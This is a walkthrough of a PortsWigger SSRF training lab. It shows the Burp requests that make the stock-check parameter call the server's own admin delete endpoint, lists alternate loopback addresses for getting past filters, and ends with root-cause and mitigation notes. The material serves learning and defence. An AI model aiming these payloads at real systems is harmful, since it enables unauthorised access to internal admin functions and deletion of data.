# Server Side Request Forgery (SSRF)

# Lab: Basic SSRF against the local server (PortsWigger apprentice)

**Lab URL:** https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/ssrf-apprentice/ssrf/lab-basic-ssrf-against-localhost#
---

## Objective

Use a server-side request forgery (SSRF) vulnerability in the stock-check feature to make the application access the internal admin interface (`http://localhost/admin`) and delete the user `carlos` from the admin panel.

## Lab setup

* Tools: Burp Suite (Proxy + Repeater), browser proxied through Burp
* Notes: I was not logged in as admin in your browser. The admin interface is only accessible from the server itself (loopback). The goal is to coerce the server to request the admin delete endpoint.

---

## Summary of vulnerability

The application exposes a "stock check" feature that accepts a URL (`stockApi`) and performs a server-side HTTP request to fetch stock data. Because the app does not sufficiently validate the supplied URL, an attacker can point this parameter to internal services (e.g. `http://localhost`) and trigger sensitive actions available only from loopback.

This lab demonstrates using SSRF to make the server call its local admin endpoint and perform a destructive action (delete user `carlos`).

---

## Walkthrough / Reproduction steps

1. Proxy your browser through Burp and open the product page, click on a product and click the stock-check feature.
2. Capture the request that performs the stock check. The original working request looks like:

```http
POST /product/stock HTTP/2
Host: <lab-host>
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D2
```

3. Confirm the SSRF works by setting `stockApi=http://localhost/admin` and observing the returned admin HTML (Users list).

4. Trigger the admin delete action by changing the `stockApi` parameter to the delete endpoint (server must call it):

```http
POST /product/stock HTTP/2
Host: <lab-host>
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.0.0.1/admin/delete?username=carlos
```

5. Send the request through Burp Repeater. The server-side request will be performed from the application server (loopback) and delete the `carlos` user.

6. Confirm success by fetching the admin page again (either via SSRF pointing to `/admin` or by using the lab UI). The `carlos` user should no longer appear. The lab will mark as solved.

---

## Variants / troubleshooting

If the delete attempt returns `401 Unauthorized` or no deletion occurs, try alternate loopback addresses (some app SSRF filters or network stacks behave differently):

* `http://127.0.0.1/admin/delete?username=carlos`
* `http://127.0.0.1:80/admin/delete?username=carlos`
* `http://localhost:80/admin/delete?username=carlos`
* `http://[::1]/admin/delete?username=carlos`
* `http://127.1/admin/delete?username=carlos`

Also check for redirects: some admin delete endpoints respond with an HTTP redirect. If the SSRF request handler doesn't follow redirects by default, point `stockApi` to the final redirect target.

---

## Root cause

- Insufficient validation and access control for user-provided URLs used in server-side HTTP requests. The application treats user-supplied addresses as trusted and performs requests to internal services.

## Mitigations / Best practices

* Restrict outbound HTTP requests from application servers to only required domains/IPs (eg. use an allowlist).
* Validate and sanitize user-supplied URLs carefully; forbid loopback, link-local, and private IP ranges when not required.
* Implement explicit server-side allowlisting for services the application must call.
* Use network segmentation and egress filters so that application servers cannot reach admin interfaces.
* Ensure sensitive actions (delete, admin tasks) require proper authentication and CSRF protections, even for internal requests.
